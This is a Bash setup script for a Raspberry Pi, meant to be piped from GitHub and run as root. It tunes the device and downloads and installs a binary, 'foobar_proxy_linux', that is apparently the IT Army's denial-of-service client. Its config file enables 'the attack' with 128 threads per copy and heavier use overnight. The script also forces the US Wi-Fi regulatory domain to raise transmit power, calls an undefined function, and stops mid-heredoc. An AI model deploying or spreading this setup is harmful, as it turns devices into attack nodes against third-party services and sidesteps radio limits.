# Run this with: sudo bash -c "curl -sSL https://raw.githubusercontent.com/Glory-2-Ukraine/IT-Army-Raspberry-Pi-Setup/refs/heads/main/RPi-04042026 -o /usr/local/bin/setup.sh && chmod +x /usr/local/bin/setup.sh && /usr/local/bin/setup.sh"

# =========================
# FOOBAR Raspberry Pi 4B Optimized Setup
# Features:
# - Dynamic resource monitoring (CPU, Mem, Temp, Network)
# - Time-based throttling (full throttle midnight-6am)
# - Absolute priority for SSH and Pi Connect
# - Network watchdog and QoS
# - Crash protection and auto-restart
# =========================

# ---- Tunables ----
APP_NAME="foobar_proxy_linux"

# Resource limits
APP_CPU_QUOTA_DAY="25%"      # Daytime CPU limit
APP_CPU_QUOTA_NIGHT="80%"    # Nighttime CPU limit (midnight-6am)
APP_MEM_MAX="768M"           # Memory limit
APP_NICE=19                  # Nice value
APP_DEADMAN_EVERY="6h"       # Deadman timer
APP_HEARTBEAT_EVERY="5m"     # Heartbeat timer

# Network
IFACE="${IFACE:-wlan0}"
LAN_SSH_CLIENT="192.168.1.0/24"  # Your local network for SSH priority
COOLDOWN_S=180                 # Reconnect cooldown
TIMER_SEC=15                  # Watchdog check interval
GW_MISS_MAX=3                 # Gateway miss threshold

# Thresholds
MAX_LOAD=0.8                  # Max 15-min load average
MAX_TEMP=70                   # Max CPU temp in Celsius
MAX_CPU_DAY=60                # Max CPU% during day
MAX_CPU_NIGHT=90              # Max CPU% during night
APP_MEM_MAX_DAY="512M"
APP_MEM_MAX_NIGHT="768M"
MAX_MEM=85                    # Max memory usage %
MAX_NET_LATENCY=200           # Max ping latency to gateway (ms)

# Time window for full throttle (midnight-6am)
FULL_THROTTLE_START="00:00"
FULL_THROTTLE_END="06:00"

# ---- ITARMY installer + runtime ----
ITARMY_INSTALL_URL="${ITARMY_INSTALL_URL:-https://github.com/porthole-ascend-cinnamon/foobar_proxy_releases/releases/latest/download/foobar_proxy_linux_arm64}"
ITARMY_INSTALLER_PATH="${ITARMY_INSTALLER_PATH:-/opt/itarmy/bin/}"
ITARMY_BIN="/opt/itarmy/bin/foobar_proxy_linux"
ITARMY_LANG="${ITARMY_LANG:-en}"
ITARMY_USER_ID="${ITARMY_USER_ID:-NTI3MjIzNzgxNQ==}"
ITARMY_COPIES="${ITARMY_COPIES:-1}"
ITARMY_THREADS="${ITARMY_THREADS:-128}"

# ---- Power Optimization Tunables ----
# CPU Optimization
CPU_GOVERNOR="performance"          # Governor: performance, ondemand, powersave
CPU_MAX_FREQ_DAY=1200000            # Daytime max frequency (1.2GHz)
CPU_MAX_FREQ_NIGHT=1400000          # Nighttime max frequency (1.4GHz)

# WiFi Optimization
WIFI_POWER_SAVE=0                   # 0=disabled (max performance), 1=enabled
WIFI_TX_POWER=30                    # TX power level (15-30)

# Peripheral Management
DISABLE_BLUETOOTH=1                 # 1=disable Bluetooth
DISABLE_HDMI=1                      # 1=disable HDMI
DISABLE_LEDS=1                      # 1=disable activity LEDs

# USB Power Management
USB_AUTOSUSPEND=0                   # Disabled on this build to avoid destabilizing USB Wi-Fi

# Storage Optimization
ENABLE_NOATIME=1                    # 1=mount with noatime
DIRTY_WRITEBACK_LOW=3000            # Low load writeback delay (ms)
DIRTY_WRITEBACK_HIGH=500            # High load writeback delay (ms)

# Memory Optimization
ENABLE_ZSWAP=1                      # 1=enable zswap
SWAPPINESS=10                       # Swappiness value (10-60)

# Thermal Management
THERMAL_LIMIT=65                    # Thermal trip point (°C)


# ---- End Tunables ----

# Validate thread/copy limits
if [[ ${ITARMY_THREADS} -gt 4096 ]]; then
    echo "Warning: ITARMY_THREADS (${ITARMY_THREADS}) exceeds maximum 4096, capping to 4096"
    ITARMY_THREADS=4096
fi
if [[ ${ITARMY_COPIES} -gt 4 ]]; then
    echo "Warning: ITARMY_COPIES (${ITARMY_COPIES}) exceeds maximum 4, capping to 4"
    ITARMY_COPIES=4
fi

backup_if_exists() { local f="$1"; [[ -e "$f" ]] && cp -a "$f" "${f}.BACKUP.$(date +%Y%m%d-%H%M%S)"; }
cat_as_root() {
  local path="$1" mode="${2:-0644}"
  if ! tee "$path" >/dev/null; then
      echo "ERROR: Failed to write to $path"
      exit 1
  fi
  chown root:root "$path"
  chmod "$mode" "$path"
}


cat_as_root_append() {
  local path="$1" mode="${2:-0644}"
  tee -a "$path" >/dev/null
  chown root:root "$path"
  chmod "$mode" "$path"
}

need_root

# =========================
# 1. Base Setup
# =========================
echo "==> 1) Installing base packages and dependencies"
apt-get update -y
apt-get install -y \
  ca-certificates curl wget file \
  iproute2 iputils-ping network-manager \
  iw wireless-tools rfkill \
  htop lm-sensors iotop iftop jq bc stress-ng

# =========================
# POWER OPTIMIZATION SYSTEM DOCUMENTATION
# =========================
# This system provides comprehensive power management while preserving
# network performance for FOOBAR. All features are configurable via
# variables at the top of this script.
#
# Key Features:
# - Dynamic CPU frequency scaling (day/night modes)
# - WiFi power management (disabled by default for max performance)
# - Peripheral power saving (Bluetooth, HDMI, LEDs)
# - USB power management (auto-suspend for non-critical devices)
# - Storage optimizations (noatime, dirty page tuning)
# - Memory optimizations (zswap, swappiness)
# - Thermal management
# - Kernel network tuning
#
# Configuration:
# All settings are configurable via variables at the top of the script.
# Default settings are optimized for FOOBAR performance with balanced
# power consumption.
#
# Logging:
# All power optimizations are logged to /var/log/foobar/setup.log
# Runtime adjustments are logged to /var/log/foobar/resource-monitor.log
#
# Verification:
# After setup, verify your configuration with:
# cat /var/log/foobar/setup.log
# =========================


# =========================
# 2. Network Interface Selection and Optimization for FOOBAR
# =========================
echo "==> 2) Configuring optimal network interface for FOOBAR"

# 1. Check available wireless interfaces
AVAILABLE_WLAN=$(ip -o link show | awk -F': ' '$2 ~ /^wlan/ {print $2}' | sort)
echo "Available wireless interfaces: $AVAILABLE_WLAN"

CURRENT_DEFAULT_IFACE=$(ip route | awk '/^default/ {for(i=1;i<=NF;i++) if($i=="dev") {print $(i+1); exit}}' || true)
echo "Current default route interface: ${CURRENT_DEFAULT_IFACE:-none}"

# 2. Safely prefer wlan1 only if it is actually usable
if echo "$AVAILABLE_WLAN" | grep -q "wlan1"; then
    echo "wlan1 detected; testing before switching"

    nmcli device set wlan1 managed yes 2>/dev/null || true
    ip link set wlan1 up 2>/dev/null || true

    # Give the interface a moment to settle
    sleep 3

    WLAN1_HAS_IP=0
    WLAN1_HAS_DEFAULT=0

    ip -4 addr show wlan1 | grep -q 'inet ' && WLAN1_HAS_IP=1
    ip route | awk '/^default/ {for(i=1;i<=NF;i++) if($i=="dev" && $(i+1)=="wlan1") found=1} END{exit !found}' && WLAN1_HAS_DEFAULT=1 || true

    if [[ "$WLAN1_HAS_IP" -eq 1 && "$WLAN1_HAS_DEFAULT" -eq 1 ]]; then
        IFACE="wlan1"
        echo "wlan1 is active and has the default route; switching away from wlan0"

        nmcli device disconnect wlan0 2>/dev/null || true
        nmcli device set wlan0 managed no 2>/dev/null || true
        ip link set wlan0 down 2>/dev/null || true
    else
        IFACE="wlan0"
        echo "wlan1 exists but is not yet carrying traffic; keeping wlan0 active"

        nmcli device set wlan0 managed yes 2>/dev/null || true
        ip link set wlan0 up 2>/dev/null || true
    fi
else
    IFACE="wlan0"
    echo "Using wlan0 (wlan1 not available)"

    nmcli device set wlan0 managed yes 2>/dev/null || true
    ip link set wlan0 up 2>/dev/null || true
fi

# Export chosen interface for child processes launched from this script
export IFACE

# Recovery: if wlan1 was selected but connectivity is not actually up, fall back to wlan0
if [[ "$IFACE" == "wlan1" ]]; then
    if ! ip route | awk '/^default/ {for(i=1;i<=NF;i++) if($i=="dev" && $(i+1)=="wlan1") found=1} END{exit !found}'; then
        echo "wlan1 selected but not carrying default route; restoring wlan0"

        nmcli device set wlan0 managed yes 2>/dev/null || true
        ip link set wlan0 up 2>/dev/null || true
        IFACE="wlan0"
        export IFACE
    fi
fi

# 3. Optimize the selected interface for FOOBAR
echo "Optimizing $IFACE for high-throughput operation"
# Disable power saving completely
iw dev "$IFACE" set power_save off 2>/dev/null || true
ACTIVE_CON=$(nmcli -t -f NAME,DEVICE connection show --active | awk -F: -v d="$IFACE" '$2==d{print $1; exit}')
[[ -n "$ACTIVE_CON" ]] && nmcli connection modify "$ACTIVE_CON" 802-11-wireless.powersave 2 2>/dev/null || true

# Increase TX power (if supported)
iw reg set US 2>/dev/null || true  # Set to US regulatory domain for max power
iwconfig "$IFACE" txpower 30 2>/dev/null || true  # Set max transmit power

# Enable TCP optimizations for high throughput
SYSCTL_DROPIN="/etc/sysctl.d/99-custom-net-tuning.conf"
cat <<'EOF' | cat_as_root "$SYSCTL_DROPIN" 0644
# Network tuning (generic)
net.core.rmem_max=16777216
net.core.wmem_max=16777216
net.ipv4.tcp_rmem=4096 87380 16777216
net.ipv4.tcp_wmem=4096 65536 16777216
net.ipv4.tcp_congestion_control=bbr
net.ipv4.tcp_tw_reuse=1
net.ipv4.tcp_fin_timeout=30
EOF
sysctl --system >/dev/null 2>&1


# 4. Disable all other wireless interfaces
if [[ "$IFACE" == "wlan1" ]]; then
    # wlan1 is confirmed active, so suppress wlan0
    while IFS= read -r iface; do
        [[ -n "$iface" ]] || continue
        echo "Disabling $iface to prevent interference"
        nmcli device disconnect "$iface" 2>/dev/null || true
        nmcli device set "$iface" managed no 2>/dev/null || true
        ip link set "$iface" down 2>/dev/null || true
    done < <(printf '%s\n' "$AVAILABLE_WLAN" | grep -vx "$IFACE" || true)
else
    # Keep wlan1 available as a standby path if wlan0 is still active
    if echo "$AVAILABLE_WLAN" | grep -q "wlan1"; then
        echo "Keeping wlan1 available as standby; not disabling it"
        nmcli device set wlan1 managed yes 2>/dev/null || true
        ip link set wlan1 up 2>/dev/null || true
    fi
fi

# 5. Verify configuration
echo "Active wireless interface:"
ip -o link show "$IFACE"
echo "Power save setting:"
nmcli -f WIRELESS-PROPERTIES.WIFI.POWERSAVE dev show "$IFACE" 2>/dev/null | grep -i powersave || true
echo "TX Power:"
iwconfig "$IFACE" 2>/dev/null | grep "Tx-Power" || true
echo "TCP congestion control:"
sysctl net.ipv4.tcp_congestion_control 2>/dev/null

# =========================
# Power Optimization for FOOBAR (Network-Preserving)
# =========================
echo "==> Applying power optimizations (network performance preserved)"

# 1. CPU Optimization
echo "Configuring CPU governor to $CPU_GOVERNOR"
for f in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
    [[ -w "$f" ]] && echo "$CPU_GOVERNOR" > "$f"
done

for f in /sys/devices/system/cpu/cpu*/cpufreq/scaling_max_freq; do
    [[ -w "$f" ]] && echo "$CPU_MAX_FREQ_DAY" > "$f"
done

# 2. WiFi Optimization
if [[ "$WIFI_POWER_SAVE" -eq 0 ]]; then
    echo "Disabling WiFi power save for maximum throughput"
    iw dev "$IFACE" set power_save off 2>/dev/null || true
    ACTIVE_CON=$(nmcli -t -f NAME,DEVICE connection show --active | awk -F: -v d="$IFACE" '$2==d{print $1; exit}')
    [[ -n "$ACTIVE_CON" ]] && nmcli connection modify "$ACTIVE_CON" 802-11-wireless.powersave 2 2>/dev/null || true
fi

iwconfig "$IFACE" txpower "$WIFI_TX_POWER" 2>/dev/null || true

# 3. Disable Unused Peripherals
if [[ "$DISABLE_BLUETOOTH" -eq 1 ]]; then
    echo "Disabling Bluetooth"
    rfkill block bluetooth 2>/dev/null || true
    systemctl stop bluetooth 2>/dev/null || true
    systemctl disable bluetooth 2>/dev/null || true
fi

if [[ "$DISABLE_HDMI" -eq 1 ]]; then
    echo "Disabling HDMI"
    /usr/bin/tvservice -o 2>/dev/null || true
fi

if [[ "$DISABLE_LEDS" -eq 1 ]]; then
    echo "Disabling activity LEDs"
    echo 0 | tee /sys/class/leds/led0/trigger 2>/dev/null || true
fi

# 4. USB Optimization
if [[ "$USB_AUTOSUSPEND" -eq 1 ]]; then
    echo "Enabling USB auto-suspend"
    for usb in /sys/bus/usb/devices/*; do
        [[ -w "$usb/power/control" ]] || continue
        if [[ -e "$usb/net/$IFACE" ]]; then
            echo "Skipping USB autosuspend for network adapter backing $IFACE"
            continue
        fi
        echo auto > "$usb/power/control"
    done
fi

# 5. Storage Optimization
if [[ "$ENABLE_NOATIME" -eq 1 ]]; then
    mount -o remount,noatime,nodiratime / 2>/dev/null
fi

# 6. Memory Optimization
if [[ "$ENABLE_ZSWAP" -eq 1 ]]; then
    echo "1" | tee /sys/module/zswap/parameters/enabled 2>/dev/null
fi
sysctl -w vm.swappiness=$SWAPPINESS >/dev/null 2>&1

# 7. Thermal Management
echo "$((THERMAL_LIMIT*1000))" | tee /sys/class/thermal/thermal_zone0/trip_point_0_temp 2>/dev/null || true

# 8. Kernel Tuning for Network Performance
echo "Optimizing kernel for network performance"
sysctl -w net.core.somaxconn=4096          # Increase socket backlog
sysctl -w net.ipv4.tcp_max_syn_backlog=8192
sysctl -w net.ipv4.tcp_tw_reuse=1          # Enable TCP connection reuse
sysctl -w net.ipv4.tcp_fin_timeout=15      # Reduce FIN timeout
sysctl -w net.ipv4.tcp_keepalive_time=60   # Reduce keepalive frequency

# Log all power optimizations
{
echo "$(date -Is) POWER OPTIMIZATIONS APPLIED:"
echo "CPU Governor: $(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor)"
echo "CPU Max Freq: $(cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_max_freq)"
echo "WiFi Power Save: $(iw dev $IFACE get power_save)"
echo "WiFi TX Power: $(iwconfig "$IFACE" 2>/dev/null | grep -F 'Tx-Power' || true)"
echo "Bluetooth Status: $(rfkill list bluetooth 2>/dev/null | grep -cF 'Soft blocked: yes' || true)"
echo "Filesystem Mount Options: $(mount | grep -F 'on / ' || true)"
echo "HDMI Status: $(vcgencmd display_power 2>/dev/null || echo unavailable)"
echo "Thermal Limit: $(cat /sys/class/thermal/thermal_zone0/trip_point_0_temp 2>/dev/null || echo unavailable)"
echo "USB Auto-Suspend: $(cat /sys/bus/usb/devices/*/power/autosuspend_delay_ms 2>/dev/null | head -1 || echo unavailable)"
echo "Swappiness: $(sysctl vm.swappiness | awk '{print $3}')"
} >> "/var/log/foobar/setup.log"


# =========================
# 3. Create foobar.ini with time-aware settings
# =========================
echo "==> 3) Creating time-aware foobar.ini"
INI_PATH="/opt/itarmy/bin/foobar.ini"
mkdir -p "$(dirname "$INI_PATH")"

# Initial conservative settings (will be adjusted by monitor)
cat <<EOF | cat_as_root "$INI_PATH" 0644
# Змінити мову | Change language (ua | en | es | de | pl | lt)
lang = ${ITARMY_LANG}

# Запуск декількох копій (auto для максимального значення, потрібно 3+ ядер процесору та стабільний інтернет)
# Run multiple copies (set "auto" for max value, requires 3+ core CPU and stable network)
copies = ${ITARMY_COPIES}

# Кількість потоків на 1 копію | Number of threads per copy
# Для активації приберіть символ # | Remove the # symbol to enable 
threads = ${ITARMY_THREADS}

# Атака через мій IP у % від 0 до 100 (обов'язковий VPN чи віддалений сервер)
# Use my IP for the attack in % from 0 to 100 (requires VPN or remote server)
use-my-ip = 0

user-id = $(printf '%s' "$ITARMY_USER_ID" | base64 -d)
EOF

# =========================
# 4. Install FOOBAR Proxy Binary
# =========================
echo "==> 4) Downloading and installing FOOBAR proxy binary"
mkdir -p "${ITARMY_INSTALLER_PATH}"

# Download the binary directly
echo "Downloading FOOBAR proxy binary from ${ITARMY_INSTALL_URL}"
if ! curl -fsSL "${ITARMY_INSTALL_URL}" -o "${ITARMY_BIN}" ; then
    echo "ERROR: Failed to download FOOBAR binary from ${ITARMY_INSTALL_URL}"
    echo "Attempting alternative download method..."
    if ! wget -q "${ITARMY_INSTALL_URL}" -O "${ITARMY_BIN}" ; then
        echo "ERROR: All download attempts failed. Check your internet connection."
        exit 1
    fi
fi

# Set permissions
chmod +x "${ITARMY_BIN}"
chown root:root "${ITARMY_BIN}"

# Verify the binary
if ! file "${ITARMY_BIN}" | grep -q "ELF"; then
    echo "ERROR: Downloaded file is not a valid binary"
    rm -f "${ITARMY_BIN}"
    exit 1
fi

echo "FOOBAR binary installed successfully at ${ITARMY_BIN}"

# =========================
# 5. Install FOOBAR Service
# =========================
echo "==> 5) Installing FOOBAR systemd service"

# Create service file
cat > /etc/systemd/system/foobar_proxy_linux.service <<EOF
